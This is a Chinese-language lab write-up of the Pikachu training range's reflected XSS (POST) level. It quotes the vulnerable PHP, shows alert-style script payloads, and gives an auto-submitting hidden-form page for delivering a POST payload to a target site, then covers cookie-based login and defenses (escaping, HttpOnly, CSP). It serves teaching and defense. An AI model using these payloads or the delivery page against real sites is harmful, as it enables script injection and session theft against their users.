# 反射型 XSS（POST）：同一个漏洞，换了一种投递方式
> 这关的漏洞代码和上一关**一模一样**，唯一的差别是参数从 URL 搬进了请求体。但为了练它，作者还加了一道登录门槛——因为这一关真正的伏笔，是后面要讲的"偷 Cookie"。
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 运行环境 | phpStudy（Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4 NTS） |
| 访问方式 | `http://pikachu/` |
| 关卡位置 | Cross-Site Scripting → 反射型xss(post) |
| 入口页面 | `http://pikachu/vul/xss/xsspost/post_login.php` |
| 反射页面 | `http://pikachu/vul/xss/xsspost/xss_reflected_post.php` |
| 默认账号 | `admin` / `123456`（页面提示里写着） |
目标：和上一关一样——让页面执行一段自己写的 JavaScript。
## 二、这关多了什么
打开页面第一眼，你会觉得走错了：
![登录页](images/01-login.png)
上一关是一个"你喜欢哪个 NBA 球员"的输入框，这一关却是一个 **Username / Password 登录框**。
和上一关相比，有三处变化：
| 变化 | 说明 |
| --- | --- |
| **多了一道登录** | 不登录进不去下一页面 |
| **参数从 URL 变成请求体** | 不能直接改地址栏了 |
| **输入框反而没有长度限制** | 上一关有 `maxlength="20"`，这关没有 |
第三条挺有意思：**看起来"更安全"的 POST，反而让输入更方便了。**
## 三、源码分析
### 3.1 登录页 `post_login.php`
```php
if(isset($_POST['submit'])){
    if($_POST['username']!=null && $_POST['password']!=null){
        //这里没有使用预编译方式,而是使用的拼接SQL,所以需要手动转义防止SQL注入
        $username=escape($link, $_POST['username']);
        $password=escape($link, $_POST['password']);
        $query="select * from users where username='$username' and password=md5('$password')";
        $result=execute($link, $query);
        if(mysqli_num_rows($result)==1){
            $data=mysqli_fetch_assoc($result);
            //登录时，生成cookie,1个小时有效期，供其他页面判断
            setcookie('ant[uname]',$_POST['username'],time()+3600);
            setcookie('ant[pw]',sha1(md5($_POST['password'])),time()+3600);
            header("location:xss_reflected_post.php");
        }else{
            $html ="<p>username or password error!</p>";
        }
    }
}
```
两个关键点：
1. **登录成功后会写两个 Cookie**：`ant[uname]` 和 `ant[pw]`，有效期 1 小时；
2. **登录成功后 302 跳转**到 `xss_reflected_post.php`。
### 3.2 反射页 `xss_reflected_post.php`
先校验登录：
```php
$link=connect();
$is_login_id=check_xss_login($link);
if(!$is_login_id){
    header("location:post_login.php");   // 没登录，踢回去
}
```
然后处理输入：
```php
if(isset($_POST['submit'])){
    if(empty($_POST['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{
        //下面直接将前端输入的参数原封不动的输出了,出现xss
        if($_POST['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_POST['message']}一样，永远年轻，永远热血沸腾！</p><img src='...kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_POST['message']},i don't care!</p>";
        }
    }
}
```
**注意作者自己写的注释**：
> 下面直接将前端输入的参数原封不动的输出了,出现xss
和上一关对比一下：
| | 上一关（GET） | 这一关（POST） |
| --- | --- | --- |
| 取值方式 | `$_GET['message']` | `$_POST['message']` |
| 输出方式 | 直接拼接 | 直接拼接 |
| 有没有转义 | 没有 | 没有 |
**漏洞代码一模一样，只是换成从请求体里取值。**
### 3.3 登录校验 `check_xss_login()`
`inc/function.php` 里：
```php
function check_xss_login($link){
    if(isset($_COOKIE['ant']['uname']) && isset($_COOKIE['ant']['pw'])){
        $username=escape($link, $_COOKIE['ant']['uname']);
        $password=escape($link, $_COOKIE['ant']['pw']);
        $query="select * from users where username='$username' and sha1(password)='$password'";
        $result=execute($link,$query);
        if(mysqli_num_rows($result)==1){
            $data=mysqli_fetch_assoc($result);
            return $data['id'];
        }else{
            return false;
        }
    }else{
        return false;
    }
}
```
登录状态**完全靠 Cookie 判断**。这就是为什么作者要你先登录——后面讲"偷 Cookie"时，偷的就是这个。
## 四、完整操作
### 4.1 登录
在登录页输入：
```
Username: admin
Password: 123456
```
点 Login。
成功后会自动跳转到「Which NBA player do you like?」页面，页面上方显示：
```
你已经登陆成功,退出登陆
```
### 4.2 输入 payload
在输入框里直接输入：
```html
<script>alert(1)</script>
```
点 submit。
**这关不需要改地址栏**——因为输入框没有 `maxlength`：
```html
<input class="xssr_in" type="text" name="message" />
```
上一关的输入框是 `<input ... maxlength="20" />`，25 个字符的 payload 塞不进去，所以才要改 URL。
**这一关反而可以直接输。**
### 4.3 又是"没弹窗"
![反射结果](images/02-reflected.png)
页面显示：
```
你已经登陆成功,退出登陆
who is ,i don't care!
```
和上一关一模一样的困惑：**中间空了一块，没有弹窗。**
原因也一样：`<script>` 标签不产生任何可见文字，所以那块是空的。
服务器实际返回的 HTML 是：
```html
<p class='notice'>who is <script>alert(1)</script>,i don't care!</p>
```
如果做了转义，应该是：
```html
<p class='notice'>who is &lt;script&gt;alert(1)&lt;/script&gt;,i don't care!</p>
```
那样你能在页面上**看到**尖括号。
### 4.4 用红色背景确认
如果还是不确定，输入这段：
```html
<script>document.body.style.background='red'</script>
```
提交后**整个页面变红**，不可能看漏。
## 五、GET 与 POST 的对比
这是这一关最值得记的部分。
### 5.1 一张表
| 维度 | 反射型 XSS（GET） | 反射型 XSS（POST） |
| --- | --- | --- |
| **参数位置** | URL 查询字符串 `?message=` | 请求体（body） |
| **能否直接改地址栏** | ✅ 能 | ❌ 不能 |
| **输入框长度限制** | 有 `maxlength="20"` | **无** |
| **需要登录吗** | 不需要 | **需要** |
| **漏洞参数名** | `$_GET['message']` | `$_POST['message']` |
| **输出是否转义** | ❌ 没有 | ❌ 没有 |
| **投递 payload 的方式** | 发一条链接 | 构造自动提交的表单页 |
| **浏览器历史是否记录** | 会（完整 URL） | 不会 |
| **危害等级** | 中 | 中 |
| **漏洞原理** | 完全一样 | 完全一样 |
### 5.2 唯一的实质区别：投递方式
**GET 型**：payload 在 URL 里，攻击者可以直接把这条链接发给受害者。
```
http://target.com/xss.php?message=<script>...</script>
```
点开就中。
**POST 型**：payload 在请求体里，没法做成一条可点击的链接。
那怎么办？攻击者做一个网页，里面藏一个**自动提交的表单**：
```html
<html>
<body onload="document.forms[0].submit()">
  <form action="http://target.com/xss_reflected_post.php" method="post">
    <input type="hidden" name="message" value="<script>alert(1)</script>">
    <input type="hidden" name="submit" value="submit">
  </form>
</body>
</html>
```
受害者打开这个页面 → 表单自动提交 → payload 打到目标站 → 执行。
**效果和 GET 完全一样。**
### 5.3 为什么有人觉得 POST 更安全
常见的三个理由，以及为什么都站不住脚：
| 理由 | 为什么不对 |
| --- | --- |
| "参数不在 URL 里，看不到" | 用户看不到，但**攻击者可以构造表单** |
| "不能直接复制链接分享" | 攻击者不需要你复制，他直接发页面给你 |
| "浏览器不会记录 URL" | 这只影响取证/日志，不影响攻击能不能成 |
### 5.4 结论
> **GET 和 POST 是 HTTP 的语义区别，不是安全边界。**
>
> GET 用来"获取资源"，POST 用来"提交数据"。选哪个是**设计问题**，不是**安全问题**。
判断有没有 XSS，只看一件事：**输入有没有被原样输出到 HTML 里。**
跟它从 URL 来，还是从请求体来，**毫无关系**。
## 六、这关的额外知识点：Cookie 登录
登录成功后，服务器写入了两个 Cookie：
```http
Set-Cookie: ant[uname]=admin; expires=...
Set-Cookie: ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; expires=...
```
之后每个页面都靠这两个 Cookie 判断"你是谁"。
**这就是为什么 XSS 要偷 Cookie**——因为：
> **Cookie = 登录凭证 = 你的身份。**
拿到 Cookie，攻击者不需要密码就能以你的身份登录。
这一关先让你登录，就是为了让下一关（存储型 XSS）有东西可偷。
## 七、我学到了什么
### 7.1 GET 和 POST 不是安全与否的区别
这是最核心的一条。
做开发时，选 GET 还是 POST 取决于**语义**：查询用 GET，提交用 POST。
**但安全上，两者没有区别。** 任何"POST 更安全"的想法，都是把传输方式当成了防护措施。
### 7.2 前端长度限制，两关对比就懂了
| 关卡 | 限制 | 结果 |
| --- | --- | --- |
| GET 关 | `maxlength="20"` | 要改 URL 才能塞进 25 字符的 payload |
| POST 关 | 无 | 直接输入就行 |
**限制是随机的，不是安全策略。** 换个页面可能就没有了。
### 7.3 判断成功，永远看"输入有没有被解析"
两关都栽在同一个地方：**页面没弹窗，就以为失败了。**
正确做法：
- 看页面上能不能看到尖括号（能看到 = 被转义 = 失败）
- 用 `<script>document.body.style.background='red'</script>` 这种持久可见的 payload
- F12 看 DOM 里是 `<script>` 还是 `&lt;script&gt;`
### 7.4 光有 XSS 不够，还要有"投递方式"
GET 型自带投递方式（链接），POST 型需要额外构造页面。
这提醒我：**评估漏洞时不能只看"能不能注入"，还要看"能不能送到受害者面前"。**
## 八、防御
和上一关完全一样，因为漏洞本身没变：
```php
// 正确：输出时转义
$msg = htmlspecialchars($_POST['message'], ENT_QUOTES, 'UTF-8');
echo "<p class='notice'>who is {$msg},i don't care!</p>";
```
三层配合：
| 层 | 做法 | 作用 |
| --- | --- | --- |
| 输出编码 | `htmlspecialchars()` | 阻止代码执行 |
| Cookie 保护 | `HttpOnly` | 让 JS 读不到 `ant[uname]` |
| CSP | `Content-Security-Policy` | 禁止内联脚本 |
**特别注意第二条**：这关的 Cookie 没有设 `HttpOnly`，所以 JS 能直接 `document.cookie` 读出来。
## 九、下一关
- [x] 反射型xss(get)
- [x] 反射型xss(post)
- [ ] 存储型xss ← **下一关，危害最大的一种**
- [ ] DOM型xss
- [ ] xss之盲打、过滤、htmlspecialchars、href输出、js输出
存储型会把 payload **存进数据库**，之后每个访问页面的人都中招——包括管理员。这就是"偷 Cookie"真正派上用场的地方。
## 参考
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
- [OWASP: Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [MDN: HTTP 方法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
---
**一句话总结**：
> 这一关的漏洞代码和上一关一字不差，只是参数从 URL 搬进了请求体。
>
> **GET 和 POST 是语义区别，不是安全边界。**
